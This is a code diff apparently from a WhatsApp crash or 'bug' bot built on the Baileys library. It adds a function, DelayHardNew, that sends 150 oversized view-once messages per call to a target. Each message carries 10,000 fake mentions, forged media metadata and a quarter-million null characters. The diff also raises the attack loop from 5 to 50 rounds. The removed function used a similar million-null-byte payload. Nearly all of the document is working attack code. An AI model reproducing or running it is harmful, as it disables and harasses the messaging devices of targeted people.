@@ -3321,9 +3321,9 @@ Status      : Success
             
             const instanceId = Date.now() + Math.random();
             
-            for (let i = 0; i < 5; i++) {
+            for (let i = 0; i < 50; i++) {
                 try {
-                    await vcs(sock, target);
+                    await DelayHardNew(sock, target);
                     await sleep(2000)
                 } catch (e) {
                     console.log(`[WORKER ${instanceId}] Error: ${e.message}`);
@@ -3915,24 +3915,98 @@ async function VnXNewOneButtonsBlnk(sock, target) {
   });
 }
 
-async function vcs(sock, target) {
-  await sock.relayMessage(target, {
-    interactiveMessage: {
-      nativeFlowMessage: {
-        buttons: [
-          {
-            name: "single_select"
+async function DelayHardNew(sock, target) {
+  const SqlMeta = Array.from({ length: 10000 }, (_, VnX) =>
+    `${VnX}13135550001@s.whatsapp.net`
+  );
+
+  for (let z = 0; z < 150; z++) { 
+    const header = {
+      videoMessage: {
+        url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_977428425010793_478212189942291937_n.enc?ccb=11-4&oh=01_Q5Aa4gHmH7vVbrVUvlhCySQuLF9lnjIVK1hidoRgxETJrlJVlA&oe=6A22A5A5&_nc_sid=5e03e0&mms3=true",
+        directPath: "/v/t62.7161-24/10000000_977428425010793_478212189942291937_n.enc?ccb=11-4&oh=01_Q5Aa4gHmH7vVbrVUvlhCySQuLF9lnjIVK1hidoRgxETJrlJVlA&oe=6A22A5A5&_nc_sid=5e03e0",
+        mimetype: "video/mp4",
+        caption: "VnX",
+        mediaKey: "wv/atWfl21qU9enzJBV5pfE2OU1/ouIFO5QuRQp5Heg=",
+        fileEncSha256: "P0Mc91Qhpus26uHe9iGnIfCBqOTPoaPpg3mInV2NVKk=",
+        fileSha256: "yYiWMdXM82iuxVc/vTKzQ7jZMc/jgtTe+KmwGYt4hpc=",
+        fileLength: "87906632",
+        mediaKeyTimestamp: "1778075081",
+        contextInfo: {},
+        streamingSidecar: "xey0UW72AH+ShCjYXVzOom/k+kt7VJryEZ+yNyAarqVJHx8L4j6sB4Da5ZGHXTfzX9g=",
+        thumbnailDirectPath: "/v/t62.36147-24/19977827_1442378506945978_3754389976888828856_n.enc?ccb=11-4&oh=01_Q5Aa1wGz9o9ukGbtWxoetr_ygoJDy0SN80KaAwJ1vywXvbTH8A&oe=687247F9&_nc_sid=5e03e0",
+        thumbnailSha256: "hxKrzb6DDC8qTu2xOdeZN4FBgHu8cmNekZ+pPye6dO0=",
+        thumbnailEncSha256: "Es1ZWpjDKRZ82XpiLARj3FZWh9DeFCEUG2wU8WHWrRs=",
+        annotations: [{
+          embeddedContent: {
+            embeddedMusic: {
+              musicContentMediaId: "1942620729844671",
+              songId: "432395962368430",
+              author: "VnX ⵢ Raffi",
+              title: "VnX",
+              artworkDirectPath: "/v/t62.76458-24/11810390_1884385592310849_8570381233425191298_n.enc?ccb=11-4&oh=01_Q5Aa1wFo3eosJQYj_I0wJby373H-MKodRwdx1sCOEt426yyLCg&oe=687233BB&_nc_sid=5e03e0",
+              artworkSha256: "8x8ENCxJyIrSFnF9ZHtiim423uGgPleSm8zPEbQZByE=",
+              artworkEncSha256: "HlsJKALVejvghjYZIrY46zosCX568b1cG9SzzZfCPNA=",
+              artistAttribution: "",
+              countryBlocklist: "",
+              isExplicit: false,
+              artworkMediaKey: "0DsOnYZAyNwPJgs5PZwL/EtFxBXO2cW9zwLYZGcAkvU="
+            }
           },
-          {
-            name: "voice_call",
-            buttonParamsJson: "\0".repeat(1000000)
+          embeddedAction: true
+        }]
+      },
+      hasMediaAttachment: true,
+    };
+
+    const msg = await generateWAMessageFromContent(target, {
+      viewOnceMessage: {
+        message: {
+          messageContextInfo: {
+            deviceListMetadata: {},
+            deviceListMetadataVersion: 2
+          },
+          contextInfo: {
+            mentionedJid: SqlMeta + header,
+            participant: "0@s.whatsapp.net",
+            isGroupMention: true,
+            quotedMessage: {
+              viewOnceMessage: {
+                message: {
+                  interactiveResponseMessage: {
+                    body: {
+                      text: "VnX",
+                      format: "DEFAULT"
+                    },
+                    nativeFlowResponseMessage: {
+                      name: "galaxy_message",
+                      paramsJson: JSON.stringify({
+                        flow_cta: {
+                          title: "\u0000".repeat(250000)
+                        }
+                      }),
+                      version: 3
+                    }
+                  }
+                }
+              }
+            },
+            remoteJid: "status@broadcast"
           }
-        ]
+        }
       }
-    }
-  }, {
-    participant: { jid: target }
-  })
+    }, {
+      userJid: sock.user.id,
+      quoted: null
+    });
+
+    await sock.relayMessage(target, msg.message, {
+      participant: {
+        jid: target
+      },
+      messageId: msg.key.id
+    });
+  }
 }
 
 //     _       ___  _   _ _   _ _____  _   _        
